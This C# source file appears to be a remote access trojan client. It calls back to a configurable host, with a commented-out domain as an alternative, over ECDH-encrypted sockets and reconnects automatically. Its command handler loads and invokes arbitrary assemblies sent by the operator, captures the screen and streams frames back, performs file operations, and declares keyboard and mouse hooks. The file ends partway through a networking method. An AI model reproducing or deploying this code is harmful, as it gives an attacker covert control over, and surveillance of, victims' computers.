using System;
using Ratchet;
using System.Reflection;
using System.Windows.Forms;
using System;
using Hooker;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Drawing;
using System.Collections;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace MAJIKMATTER
{
    class Program
    {
        static void Main(string[] args)
        {
            //Connection and anyting that interupts message loop of the monitor will cause the hooks to fail
            new Thread(() =>
            {
                Connect(args);
            }).Start();
            Application.Run();
        }
        private static void Connect(string [] args)
        {
            try
            {

                if (args.Length > 0)
                {
                    RHOST = args[0];
                    if (args.Length > 1)
                    {
                        if (args[1].Length < 10)
                        { RPORT = Convert.ToInt32(args[1]); }
                    }
                }


                Client = new Ghost();
                Client.HOST = RHOST;
                Client.PORT = RPORT;
                Client.ExceptionListener += _P.Client_ExceptionListener;
                Client.PacketListener += _P.Client_PacketListener;
                Client.StatusListener += _P.Client_StatusListener;
                Client.NewClientAddedListener += _P.Client_NewClientAddedListener;
                Client.DisconnectListener += Client_DisconnectListener;
                Client.ConnectionFailed += Client_ConnectionFailed;
                Client.StartGhostClient("Client", RHOST, RPORT, _P.clientTask, _P.clientFault, false, 20000);
                //if fail
                
            }
            catch (Exception)
            {
            }
        }
        private static Ratchet.Ghost Client;
        private static Object keepALive;
        public static KVM _kvm;
        private static Connection reflect(Connection d)
        {
            try {
                string ret = "Classes:\n";
                
                Assembly Asm = Assembly.LoadFrom(d.Packet.data);
                
                Type[] myTypes = Asm.GetTypes();
                foreach (var type in myTypes)
                {
                    ret += type.ToString()+"\r\n";
                    ret += "Methods:\r\n";
                    MethodInfo[] methods = type.GetMethods();
                    foreach (var method in methods)
                    {
                        ret += " -"+ method.ToString() + "\r\n";
                    }
                }
                d.Packet = Packet.Create(ret,"<RETURN_ASM>");
            }catch(Exception e)
            { d.Packet.flag = "<ASM_ERROR>"; d.Packet.data = e.ToString(); }
            return d;
        }
        private static Connection assymble(Connection d)
        {
            try {
                string filename = "";
                string classname = "";
                string methodname = "";
                string arguments = "";
                if (d.Packet.data.ToUpper().Contains("<##>"))
                {
                    var a = new string[1] { "<##>" };
                    var list = d.Packet.data.Split(a, StringSplitOptions.None);
                    filename = list[0];
                    classname = list[1];
                    methodname = list[2];
                    arguments = list[3];
                }
                else
                {
                    d.Packet.flag = "ASM_ERROR_NO: <##> AFTER FILENAME";
                    return d;
                }
                String returnFlag = null;
                Packet pack = d.Packet;
                d.Packet = new Packet();
                Assembly Asm = Assembly.LoadFrom(filename);
                Type[] myTypes = Asm.GetTypes();
                Type myClass = null;
                foreach (var type in myTypes)
                {
                    if (type.Name.Equals(classname))
                    {
                        myClass = type;
                    }
                }
                if (myClass != null)
                {
                    MethodInfo[] methods = myClass.GetMethods();
                    MethodInfo myMethod = null;
                    foreach (var method in methods)
                    {
                        if (method.Name.Equals(methodname))
                        {
                            myMethod = method;
                        }
                    }
                    if (myMethod != null)
                    {
                        keepALive = Activator.CreateInstance(myClass);

                        if (pack.data.Equals("NOARG"))
                        {                            
                            d.Packet.data = (String)myMethod.Invoke(keepALive, null);
                            
                        }
                        else
                        {
                            Object[] argument = new object[1] {arguments}; 
                            d.Packet.data = (String)myMethod.Invoke(keepALive, argument);
                           
                        }
                    }
                    if (returnFlag != null)
                        d.Packet.flag = returnFlag;
                    else
                        d.Packet.flag = "RETURN_ASM";
                }
            }catch(Exception e)
            { d.Packet.flag = "ASM_ERROR"; d.Packet.data = e.ToString(); }
            return d;
        }
        private Connection clientTask(Connection connection)
        {

            try
            {
                if (!connection.Packet.flag.Equals(""))
                {
                    if (!connection.Tcp.Connected)
                    {
                        
                    }
                    if (connection.Packet.flag.ToUpper().Contains("<REQUEST_ID>"))
                    {
                        connection.Packet = new Packet();
                        var ID = new Ratchet.Identify.IDmaker();
                        connection.Packet.flag = "<ID>";
                        connection.Packet.data = ID.hash;
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<KVM>")&& connection.Packet.flag.ToUpper().Contains("<START>"))
                    {
                        
                        if (_kvm._Key == null)
                        {
                            _kvm = new KVM();
                            _kvm.FrameCaptured += Kvm_FrameCaptured;
                            _kvm = KVM.StartMonitor(_kvm);
                        }
                        else
                        {
                            MAJIKMATTER.KVM.StopMonitor(_kvm);
                            _kvm = new KVM();
                            _kvm.FrameCaptured += Kvm_FrameCaptured;
                            _kvm = KVM.StartMonitor(_kvm);
                        }
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<KVM>") && connection.Packet.flag.ToUpper().Contains("<STOP>"))
                    {
                        MAJIKMATTER.KVM.StopMonitor(_kvm);
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<PING>"))
                    {
                        connection.Packet = new Packet();
                        connection.Packet.flag = "<RETURN_PING>";
                        connection.Packet.data = connection.Tcp.Client.LocalEndPoint.ToString() + "::" + DateTime.Now.ToString()+ " ttl: "+ connection.Tcp.Client.Ttl.ToString();
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<ASM>"))
                    {
                        connection = assymble(connection);
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<REFLECT>"))
                    {
                        connection = reflect(connection);
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<REFLECT_ADV>"))
                    {
                        Ratchet.Reflection.Worker worker = new Ratchet.Reflection.Worker(connection.Packet.data);                      
                        connection.Packet = Packet.Create(Convert.ToBase64String(worker._Mod.Write()), "ADV_REFLECT_RETURN");
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<ASM_ADV>"))
                    {
                        string filename = "";
                        string classname = "";
                        string methodname = "";
                        string arguments = "";
                        if (connection.Packet.data.ToUpper().Contains("<##>"))
                        {
                            var a = new string[1] { "<##>" };
                            var list = connection.Packet.data.Split(a, StringSplitOptions.None);
                            filename = list[0];
                            classname = list[1];
                            methodname = list[2];
                            arguments = list[3];
                        }
                        else
                        {
                            connection.Packet.flag = "ASM_ERROR_NO: <##> AFTER FILENAME";
                        }
                        Ratchet.Reflection.Worker worker = new Ratchet.Reflection.Worker(filename,classname,methodname,new object[] { arguments },true);
                        
                        connection.Packet = Packet.Create(Convert.ToBase64String(worker._Mod.Write()), "ADV_REFLECT_RETURN");
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<CHANGE_BUFFER>"))
                    {
                        connection.RecieveBufferSize = Convert.ToInt32(connection.Packet.data);
                        connection.Packet = Packet.Create("BUFFER_CHANGED", "<RETURN>");
                    }
                    else
                    if (connection.Packet.flag.ToUpper().Contains("<FOP>"))
                    {
                        connection.Packet = new Ratchet.IO.FileOP().FOP(connection.Packet);
                    }

                    Client.SendGhostByID(connection.Packet);
                }
            }
            catch (Exception e)
            {
                connection.Packet.flag = "<TASK_ERROR>";
                connection.Packet.data = e.ToString();
                Client.SendGhostByID(connection.Packet);
            }
            return connection;
        }

        private static void Kvm_FrameBufferFull(object sender, KVM.FrameBufferEvent e)
        {
            //if (Client.GhostClientData.IsConnected)
                //Client.SendGhostByID(Packet.Create(Convert.ToBase64String(_kvm.ObjectToByteArray(e.Data)), "<KVM_FRAME_BUFFER_RETURN>"));
        }

        private static void Kvm_FrameCaptured(object sender, KVM.FrameEvent e)
        {
            var aa = Convert.ToBase64String(_kvm.ObjectToByteArray(e.Data));
            if (Client.GhostClientData.IsConnected) {
                Client.SendGhostByID(Packet.Create(Convert.ToBase64String(_kvm.ObjectToByteArray(e.Data)), "<KVM_FRAME_RETURN>"));
            }
           // 
        }

        private Connection clientFault(Connection connection)
        {
            try
            {
                Client.SendGhostByID(Packet.Create(connection.Packet.data, "<FAULT>"));
            }
            catch { }
            return connection;
        }
        private void Client_StatusListener(object sender, _StatusEvent e)
        {
            try
            {
                Client.SendGhostByID(Packet.Create("Status: " + e.Status, "<RETURN>"));
            }
            catch { }
        }
        private void Client_NewClientAddedListener(object sender, _ConnectionEvent e)
        {
            try { 
                Client.SendGhostByID(Packet.Create("Connected To Server: " + e.connection.Packet.data, "<RETURN>"));
            }
            catch { }
        }
        private void Client_PacketListener(object sender, _ConnectionEvent e)
        {
            try
            {
                //Client.SendGhostByID(e.connection.Packet);
            }
            catch { }
        }
        private void Client_ExceptionListener(object sender, _ExceptionOccured e)
        {
            if (e.Exception is System.IO.IOException)
            {
                Client = new Ghost();
                Client.HOST = RHOST;
                Client.PORT = RPORT;
                Client.ExceptionListener += Client_ExceptionListener;
                Client.PacketListener += Client_PacketListener;
                Client.StatusListener += Client_StatusListener;
                Client.NewClientAddedListener += Client_NewClientAddedListener;
                Client.StartGhostClient("Client", RHOST, RPORT, clientTask, clientFault, true, 2000);
            }
            else
            {
                try
                {
                  //  Client.SendGhostByID(Packet.Create("Exception: " + e.Exception.ToString(), "<RETURN>"));
                }
                catch { }
            }
        }

        delegate bool outDel(String a);
        public static string RHOST = "127.0.0.1";// "regztem.com";
        public static  int RPORT = 10101;
        public static Program _P = new Program();
        public static int _ConnectionTimeOut = 5000;
        private static MAJIKMATTER.Key.LowLevelKeyboardProc _KEYHOOK;
        private static MAJIKMATTER.Mouse.LowLevelMouseProc _MOUSEHOOK;



        private static void Client_ConnectionFailed(object sender, _ConnectionEvent e)
        {
            System.Threading.Thread.Sleep(_ConnectionTimeOut);
            GC.Collect();
            //_P = new Program();
           // _P.Client = new Ghost();
            lock(Ghost._clientLocker)
            {
                Ghost.ClientList = new System.Collections.Generic.List<Connection>();
            }
            Client.HOST = RHOST;
            Client.PORT = RPORT;
            Client.ExceptionListener += _P.Client_ExceptionListener;
            Client.PacketListener += _P.Client_PacketListener;
            Client.StatusListener += _P.Client_StatusListener;
            Client.NewClientAddedListener += _P.Client_NewClientAddedListener;
            Client.DisconnectListener += Client_DisconnectListener;
            Client.ConnectionFailed += Client_ConnectionFailed;
            Client.StartGhostClient("Client", RHOST, RPORT, _P.clientTask, _P.clientFault, false, 20000);
        }

        private static void Client_DisconnectListener(object sender, _ConnectionEvent e)
        {
            System.Threading.Thread.Sleep(100);
            GC.Collect();
            //_P = new Program();
            // _P.Client = new Ghost();
            lock (Ghost._clientLocker)
            {
                Ghost.ClientList = new System.Collections.Generic.List<Connection>();
            }
            Client.HOST = RHOST;
            Client.PORT = RPORT;
            Client.ExceptionListener += _P.Client_ExceptionListener;
            Client.PacketListener += _P.Client_PacketListener;
            Client.StatusListener += _P.Client_StatusListener;
            Client.NewClientAddedListener += _P.Client_NewClientAddedListener;
            Client.DisconnectListener += Client_DisconnectListener;
            Client.ConnectionFailed += Client_ConnectionFailed;
            Client.StartGhostClient("Client", RHOST, RPORT, _P.clientTask, _P.clientFault, false, 20000);
        }
    }
    
}
namespace Ratchet
{
    using System;    //using System.Runtime.Remoting.Contexts;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Linq;
    using System.Text;
    using System.Net.Sockets;
    using System.IO;
    using GhostProtocol;
    using System.Net;
    using System.Runtime.Serialization;    //using System.Runtime.Remoting.Contexts;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Reflection;
    using System.Diagnostics;
    #region Events
    public class _ReturnEvent : EventArgs
    {
        public _ReturnEvent(object obj = null)
        {
            if (obj != null)
            {
                Data = obj;
            }
        }
        public object Data { get; set; }
    }
    public class _StatusEvent : EventArgs
    {
        public _StatusEvent(string status = "", object obj = null)
        {
            if (obj != null)
            {
                Data = obj;
            }
            Status = status;
        }
        public object Data { get; set; }
        public string Status { get; set; }
    }
    public class _ConnectionEvent : EventArgs
    {
        public _ConnectionEvent(Connection conn)
        {
            try
            {
                connection = conn;
            }
            catch (Exception e)
            {
                connection.Tag = e;
            }
        }
        public Connection connection = new Connection();
    }
    public class _ExceptionOccured : EventArgs
    {
        public _ExceptionOccured(Exception ex = null)
        {
            if (ex != null)
            {
                Exception = ex;
            }
        }
        public Exception Exception { get; set; }
    }
    #endregion
    #region Classes
    //[SynchronizationAttribute]
    public class Ghost
    {

        //Events
        protected virtual void FaultReturn(_ConnectionEvent connectionEvent)
        {
            EventHandler<_ConnectionEvent> handler = FaultListener;
            if (handler != null)
            {
                handler(this, connectionEvent);
            }
        }
        public event EventHandler<_ConnectionEvent> FaultListener;
        protected virtual void ConnectionFail(_ConnectionEvent connectionEvent)
        {
            EventHandler<_ConnectionEvent> handler = ConnectionFailed;
            if (handler != null)
            {
                handler(this, connectionEvent);
            }
        }
        public event EventHandler<_ConnectionEvent> ConnectionFailed;
        protected virtual void DisconnectedEvent(_ConnectionEvent connectionEvent)
        {
            EventHandler<_ConnectionEvent> handler = DisconnectListener;
            if (handler != null)
            {
                handler(this, connectionEvent);
            }
        }
        public event EventHandler<_ConnectionEvent> DisconnectListener;
        public static readonly object _clientLocker = new object();
        public static readonly object _serverLocker = new object();
        protected virtual void newException(_ExceptionOccured e)
        {
            Exceptions.Add(e.Exception);
            EventHandler<_ExceptionOccured> handler = ExceptionListener;
            if (handler != null)
            {
                handler(this, e);
            }
        }
        public event EventHandler<_ExceptionOccured> ExceptionListener;
        protected virtual void StatusReturn(_StatusEvent status)
        {
            EventHandler<_StatusEvent> handler = StatusListener;
            if (handler != null)
            {
                handler(this, status);
            }
        }
        public event EventHandler<_StatusEvent> StatusListener;
        protected virtual void PacketReturn(_ConnectionEvent connectionEvent)
        {
            EventHandler<_ConnectionEvent> handler = PacketListener;
            if (handler != null)
            {
                handler.Invoke(this, connectionEvent);
            }
        }
        public event EventHandler<_ConnectionEvent> PacketListener;
        protected virtual void ReportNewClient(_ConnectionEvent connectionEvent)
        {
            EventHandler<_ConnectionEvent> handler = NewClientAddedListener;
            if (handler != null)
            {
                handler(this, connectionEvent);
            }
        }
        public event EventHandler<_ConnectionEvent> NewClientAddedListener;
        //Delegates
        public delegate Connection connDel(Connection connection);
        //Globals
        public static List<ServerData> ServerList = new List<ServerData>();
        public static List<Connection> ClientList = new List<Connection>();
        public int PORT;
        public string HOST;
        public ServerData GhostServerData = ServerData.Create();
        public Connection GhostClientData = Connection.Create();
        public List<Exception> Exceptions = new List<Exception>();
        public connDel ConnectionDelegate;
        public static Exception EX = null;
        //Constructors
        public Ghost()
        {
            //ServerList = new List<ServerData>();
            //ClientList = new List<Connection>();
        }
        //Methods
        public Connection startClientWorker(Connection connection)
        {
            lock (_clientLocker)
            {
                ClientList.Add(connection);
                connection.Worker.RunWorkerAsync(connection);
            }
            return connection;
        }
        public static Ghost CreateClient(String Name = "GhostClient", string Host = "127.0.0.1", int Port = 10101, Func<Connection, Connection> ClientTask = null, Func<Connection, Connection> ClientFault = null)
        {
            Ghost ghost = new Ghost();
            try
            {
                ghost.GhostClientData.RPORT = Port;
                ghost.GhostClientData.RHOST = Host;
                ghost.GhostClientData.Account.Name = Name;
                ghost.GhostClientData.ID = "NOID";
                ghost.GhostClientData.TaskFunction = ClientTask;
                ghost.GhostClientData.FaultFunction = ClientFault;
                ghost.GhostClientData = ghost.Connect(ghost.GhostClientData);
                ghost.GhostClientData = ghost.KeyExchangeClientSide(ghost.GhostClientData);
                ghost.GhostClientData.Worker = ghost.createGhostWorker();
                lock (_clientLocker)
                {
                    ClientList.Add(ghost.GhostClientData);
                }
                ghost.GhostClientData.Worker.RunWorkerAsync(ghost.GhostClientData);

            }
            catch (Exception ee)
            {
                EX = ee;
            }
            return ghost;
        }
        public static Ghost CreateServer(string Name = "GhostServer", int Port = 10101, Func<Connection, Connection> ClientTask = null, Func<Connection, Connection> ClientFault = null) //must set client task and fault functions here
        {
            Ghost ghost = new Ghost();
            ServerData serverData = ServerData.Create();
            try
            {
                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        if (server.Name.Equals(Name))
                        {
                            Name += DateTime.Now.ToString();
                        }
                    }
                }
                serverData.Name = Name;
                serverData.Port = Port;
                serverData.StartClientDelegate = ghost.startClientWorker;

                serverData.TaskFunction = ClientTask;
                serverData.FaultFunction = ClientFault;
                serverData.serverConnection = new Connection();
                serverData.serverConnection.RPORT = Port;
                serverData.serverConnection.useGhost = true;
                serverData.serverConnection.useCng = true;
                serverData.ServerWorker.DoWork += ghost.ServerWorker_DoWork;
                serverData.ServerWorker.RunWorkerCompleted += ghost.ServerWorker_RunWorkerCompleted;
                lock (_serverLocker)
                {
                    ServerList.Add(serverData);
                }
                serverData.ServerWorker.RunWorkerAsync(serverData);

            }
            catch (Exception ee)
            {
                EX = ee;
            }
            return ghost;
        }
        private void ServerWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            StatusReturn(new _StatusEvent("Server Stopped @" + DateTime.Now.ToString()));
        }
        private void ServerWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            if (e.Cancel)
                return;
            try
            {

                ServerData serverData = (ServerData)e.Argument;
                serverData.Server = new Ghost();
                serverData.CID = 0;
                serverData.serverConnection.useCng = true;
                serverData.serverConnection.useGhost = true; //IMPORTANT
                serverData.serverConnection.RecieveBufferSize = serverData.BufferSize; //set buffer size, can be dynamically changed in Task function
                serverData.serverConnection = serverData.Server.StartListener(serverData.serverConnection); //starts server on LOCAL port
                StatusReturn(new _StatusEvent("Server Started  @ " + DateTime.Now.ToString()));
                while (true)
                {
                    try
                    {
                        Connection client = Connection.Create(serverData.BufferSize);


                        client = serverData.Server.acceptClient(serverData.serverConnection);
                        if (e.Cancel)
                            return;
                        client = serverData.Server.KeyExchangeServerSide(client);
                        client.ServerName = serverData.Name;
                        if (serverData.PacketEvent != null)
                            client.PacketListener += serverData.PacketEvent;
                        client.CID = serverData.CID;
                        client.useGhost = true;
                        client.useCng = true;
                        client.Account.Name = "New Account";
                        client.ID = client.Account.Id = "NOID";
                        client.IP = client.Account.Ip = client.Tcp.Client.RemoteEndPoint.ToString();
                        serverData.Accounts.AccountsList.Add(client.Account);
                        client.LastRecv = DateTime.Now.ToString();
                        client.IsConnected = true;
                        StatusReturn(new _StatusEvent("Client Connected @ " + DateTime.Now.ToString()));
                        client.TaskFunction = serverData.TaskFunction;
                        client.FaultFunction = serverData.FaultFunction;
                        client.Worker = serverData.Server.createGhostWorker();
                        ++serverData.CID;
                        serverData.Connections.Add(client);
                        UpdateServerData(serverData);
                        client.Worker.RunWorkerAsync(client);
                        if (NewClientAddedListener != null)
                            ReportNewClient(new _ConnectionEvent(client));

                    }
                    catch (Exception ee)
                    {
                        newException(new _ExceptionOccured(ee));
                    }
                }
            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
            }
        }
        public ServerData StartGhostServer(ServerData serverData) //must set client task and fault functions here
        {
            try
            {
                serverData.Name = "Ghost Server " + DateTime.Now.ToString();
                serverData.serverConnection = new Connection();
                serverData.StartClientDelegate = startClientWorker;

                serverData.serverConnection.RPORT = Convert.ToInt32(serverData.Port);
                serverData.serverConnection.useGhost = true;
                serverData.ServerWorker.DoWork += ServerWorker_DoWork;
                serverData.ServerWorker.RunWorkerCompleted += ServerWorker_RunWorkerCompleted;
                lock (_serverLocker)
                {
                    ServerList.Add(serverData);
                }
                System.Threading.Thread.Sleep(100);
                serverData.ServerWorker.RunWorkerAsync(serverData);

            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
            }
            return serverData;
        }
        public ServerData StartGhostServer(string Name = "GhostServer", int Port = 10101, Func<Connection, Connection> ClientTask = null, Func<Connection, Connection> ClientFault = null, EventHandler<_ConnectionEvent> PacketEvent = null) //must set client task and fault functions here
        {

            ServerData serverData = ServerData.Create();
            try
            {
                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        if (server.Name.Equals(Name))
                        {
                            Name += DateTime.Now.ToString();
                        }
                    }
                }
                serverData.PacketEvent = PacketEvent;
                serverData.Name = Name;
                serverData.StartClientDelegate = startClientWorker;
                serverData.Port = Port;
                serverData.TaskFunction = ClientTask;
                serverData.FaultFunction = ClientFault;
                serverData.serverConnection = new Connection();
                serverData.serverConnection.RPORT = Port;
                serverData.serverConnection.useGhost = true;
                serverData.serverConnection.useCng = true;
                serverData.ServerWorker.DoWork += ServerWorker_DoWork;
                serverData.ServerWorker.RunWorkerCompleted += ServerWorker_RunWorkerCompleted;
                lock (_serverLocker)
                {
                    ServerList.Add(serverData);
                }
                serverData.ServerWorker.RunWorkerAsync(serverData);

            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
            }
            return serverData;
        }
        public Connection StartGhostClient(String Name = "GhostClient", string Host = "127.0.0.1", int Port = 10101, Func<Connection, Connection> ClientTask = null, Func<Connection, Connection> ClientFault = null, bool AutoReconnect = false, int Timeout = 30000)
        {
            GhostClientData = Connection.Create();

            GhostClientData.RPORT = Port;
            GhostClientData.RHOST = Host;
            GhostClientData.ID = "NOID";
            GhostClientData.Account.Name = Name;
            GhostClientData.TaskFunction = ClientTask;
            GhostClientData.FaultFunction = ClientFault;
            GhostClientData = Connect(GhostClientData, Timeout, AutoReconnect); // will throw failed connection here
            if (GhostClientData.IsConnected == false)
            {
                //ConnectionFail(new _ConnectionEvent(GhostClientData));
                return GhostClientData;
            }
            GhostClientData = KeyExchangeClientSide(GhostClientData);
            GhostClientData.Worker = createGhostWorker();

            ReportNewClient(new _ConnectionEvent(GhostClientData));
            lock (_clientLocker)
            {
                ClientList.Add(GhostClientData);
            }
            GhostClientData.Worker.RunWorkerAsync(GhostClientData);
            return GhostClientData;
        }
        public BackgroundWorker createGhostWorker()
        {
            BackgroundWorker backgroundWorker1 = new BackgroundWorker();
            backgroundWorker1.WorkerSupportsCancellation = true;
            backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(Client_Listen_DoWork);
            backgroundWorker1.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(Client_Listen_RunWorkerCompleted);
            return backgroundWorker1;
        }

        public Connection acceptClient(Connection d) //add Ghost
        {
            d.Tcp = d.Server.AcceptTcpClient();
            if (d.Tcp.Connected)
            {

                d.Ghost = new GhostProtocol.Ghoster();
                d.whisp = new GhostProtocol.Whisp();

                d.Stream = d.Tcp.GetStream();
                return d;
            }
            return d;
        }
        public Connection StartListener(Connection d)
        {

            d.Server = null;
            try
            {
                IPAddress localAddr = IPAddress.Any;
                d.Server = new TcpListener(localAddr, d.RPORT);
                d.Server.Start();
            }
            catch (Exception e)
            {
                d.Tag = e;
            }
            return d;

        }
        public Connection KeyExchangeServerSide(Connection connection)
        {
            try
            {
                connection.whisp = new Whisp();
                connection.whisp.ratchet.dh = new ECDHAES256.DH();
                connection.whisp.cng = connection.whisp.ratchet.dh.a(new ECDHAES256.CNG());
                connection.Packet = Packet.Create(Convert.ToBase64String(connection.whisp.cng.publicKey));
                connection = Send(connection);
                connection = Recieve(connection);
                connection = ParsePacket(connection);
                connection.whisp.cng.bpublicKey = Convert.FromBase64String(connection.Packet.data);
                connection.useCng = true; connection.useGhost = true; connection.useCompression = true;
                connection.whisp.cng = connection.whisp.ratchet.dh.a(connection.whisp.cng);
                connection.cng = connection.whisp.cng;
                connection.whisp = new Whisp();
                connection.whisp.cng = connection.cng;
                connection.Ghost = new Ghoster();
                connection.whisp.aname = "serverSide";
                //UpdateConnection(connection);       
            }
            catch (Exception ee)
            {
                connection.Tag = ee;
            }
            return connection;
        }
        public Connection KeyExchangeClientSide(Connection connection)
        {
            try
            {
                connection.whisp = new Whisp();
                connection.useCng = true;
                connection.useGhost = true;
                connection.whisp.ratchet.dh = new ECDHAES256.DH();
                connection = Recieve(connection);
                connection = ParsePacket(connection);
                connection.whisp.cng.bpublicKey = Convert.FromBase64String(connection.Packet.data);
                connection.whisp.cng = connection.cng = connection.whisp.ratchet.dh.b(connection.whisp.cng); //MAKE KEY              
                connection.Packet = Packet.Create(Convert.ToBase64String(connection.whisp.cng.publicKey));
                connection = Send(connection);
                connection.cng = connection.whisp.cng;
                connection.whisp = new Whisp();
                connection.whisp.cng = connection.cng;
                connection.Ghost = new Ghoster();
                connection.whisp.aname = "clientSide";
                //UpdateConnection(connection);
            }
            catch (Exception ee)
            {
                connection.Tag = ee;
            }
            return connection;
        }
        public Connection MakePacket(Connection connection)
        {
            StringBuilder str = new StringBuilder();
            str.Append(connection.Packet.ip);
            str.Append("<!!>" + connection.Packet.arg);
            str.Append("<!!>" + connection.Packet.length);
            str.Append("<!!>" + connection.Packet.flag);
            str.Append("<!!>" + connection.Packet.data);
            str.Append("<!!>");
            connection.Packet.packet = str.ToString();
            connection.Packet.bytes = Encoding.Unicode.GetBytes(connection.Packet.packet);
            return connection;
        }
        public static Connection _MakePacket(Connection connection)
        {
            StringBuilder str = new StringBuilder();
            str.Append(connection.Packet.ip);
            str.Append("<!!>" + connection.Packet.arg);
            str.Append("<!!>" + connection.Packet.length);
            str.Append("<!!>" + connection.Packet.flag);
            str.Append("<!!>" + connection.Packet.data);
            str.Append("<!!>");
            connection.Packet.packet = str.ToString();
            connection.Packet.bytes = Encoding.Unicode.GetBytes(connection.Packet.packet);
            return connection;
        }

        public Connection ParsePacket(Connection connection)
        {
            if (connection.Packet.bytes.Length > 0)
            {
                try
                {
                    connection.Packet.packet = Encoding.Unicode.GetString(connection.Packet.bytes);
                }
                catch (Exception ee)
                {
                    connection.Tag = ee;
                    return connection;
                }
            }
            else
            {
                connection.Packet.flag = "-1";
                return connection;
            }
            if (connection.Packet.packet != null)
            {
                if (connection.Packet.packet.Contains("<!!>"))
                {
                    try
                    {
                        string[] a = new string[] { "<!!>" };
                        string[] split = connection.Packet.packet.Split(a, StringSplitOptions.None);
                        connection.Packet.ip = split[0];
                        connection.Packet.arg = split[1];
                        connection.Packet.length = split[2];
                        connection.Packet.flag = split[3];
                        connection.Packet.data = split[4];
                        PacketReturn(new _ConnectionEvent(connection));
                        connection.PacketListenerMethod?.Invoke(connection.Packet, new _ConnectionEvent(connection));
                    }
                    catch (Exception ee)
                    {
                        connection.Tag = ee;
                        connection.Packet.flag = "-1";
                        return connection;
                    }
                }

            }
            return connection;
        }
        public Connection Send(Connection d)
        {

            try
            {
                d.Packet.ip = d.Tcp.Client.LocalEndPoint.ToString();
                d = MakePacket(d);
                if (d.Stream.CanWrite) //send alice public key
                {
                    d.Stream.Write(d.Packet.bytes, 0, d.Packet.bytes.Length);
                }
                return d;
            }
            catch (Exception)
            {
                if (d.FaultFunction != null)
                { d = d.FaultFunction(d); }
                return d;
            }
        }

        public Connection SendGhost(Connection connection)
        {
            try
            {
                //get whisp
                connection = getConnection(connection);
                if (!connection.Tcp.Connected)
                {
                    try
                    {
                        //removeConnection(connection);
                        connection.Stream.Close();
                        return connection;
                    }
                    catch { }
                }
                connection.Packet.ip = connection.Tcp.Client.LocalEndPoint.ToString();
                connection = MakePacket(connection);
                connection.whisp.cng.plaintextBytes = connection.Packet.bytes;
                connection.whisp = connection.Ghost.Ghost(connection.whisp);
                //connection.cng = connection.whisp.cng; //update cng

                if (connection.Stream.CanWrite)
                {
                    connection.Stream.Write(connection.whisp.bytes, 0, connection.whisp.bytes.Length);
                }
                connection.Clean();
                //return whisp
                UpdateConnection(connection);
                return connection;
            }
            catch (Exception)
            {
                connection.Clean();
                if (connection.FaultFunction != null)
                { connection = connection.FaultFunction.Invoke(connection); }
                return connection;
            }
        }
        public Connection SendGhostByID(Packet packet, string ID = "NOID")
        {
            try
            {

                //get whisp
                Connection connection = getConnectionByID(ID);
                if (!connection.Tcp.Connected)
                {
                    try
                    {
                        //removeConnection(connection);
                        connection.Stream.Close();
                        return connection;
                    }
                    catch { }
                }
                connection.Packet = packet;
                connection.Packet.ip = connection.Tcp.Client.LocalEndPoint.ToString();
                connection = MakePacket(connection);
                connection.whisp.cng.plaintextBytes = connection.Packet.bytes;
                connection.whisp = connection.Ghost.Ghost(connection.whisp);
                //connection.cng = connection.whisp.cng; //update cng

                if (connection.Stream.CanWrite)
                {
                    connection.Stream.Write(connection.whisp.bytes, 0, connection.whisp.bytes.Length);
                }
                connection.Clean();
                //return whisp
                UpdateConnection(connection);
                return connection;
            }
            catch (Exception)
            {
                Connection connection = getConnectionByID(ID);
                connection.Clean();
                if (connection.FaultFunction != null)
                { connection = connection.FaultFunction.Invoke(connection); }
                return connection;
            }
        }
        public Connection SendGhostByCID(Packet packet, int CID = 0)
        {
            try
            {

                //get whisp
                Connection connection = getConnectionByCID(CID);
                if (!connection.Tcp.Connected)
                {
                    try
                    {
                        //removeConnection(connection);
                        connection.Stream.Close();
                        return connection;
                    }
                    catch { }
                }
                connection.Packet = packet;

                connection.Packet.ip = connection.Tcp.Client.LocalEndPoint.ToString();
                connection = MakePacket(connection);
                connection.whisp.cng.plaintextBytes = connection.Packet.bytes;
                connection.whisp = connection.Ghost.Ghost(connection.whisp);
                //connection.cng = connection.whisp.cng; //update cng

                if (connection.Stream.CanWrite)
                {
                    connection.Stream.Write(connection.whisp.bytes, 0, connection.whisp.bytes.Length);
                }
                connection.Clean();
                //return whisp
                UpdateConnection(connection);
                return connection;
            }
            catch (Exception)
            {
                Connection connection = getConnectionByCID(CID);

                connection.Clean();
                if (connection.FaultFunction != null)
                { connection = connection.FaultFunction.Invoke(connection); }
                return connection;
            }
        }
        public Connection SendGhostByIP(Packet packet, string IP = "127.0.0.1:10101")
        {

            try
            {
                Connection connection = getConnectionByIP(IP);
                if (!connection.Tcp.Connected)
                {
                    try
                    {
                        //removeConnection(connection);
                        connection.Stream.Close();
                        return connection;
                    }
                    catch { }
                }
                connection.Packet = packet;
                //get whisp               
                connection.Packet.ip = connection.Tcp.Client.LocalEndPoint.ToString();
                connection = MakePacket(connection);
                connection.whisp.cng.plaintextBytes = connection.Packet.bytes;
                connection.whisp = connection.Ghost.Ghost(connection.whisp);
                //connection.cng = connection.whisp.cng; //update cng

                if (connection.Stream.CanWrite)
                {
                    connection.Stream.Write(connection.whisp.bytes, 0, connection.whisp.bytes.Length);
                }
                connection.Clean();
                //return whisp
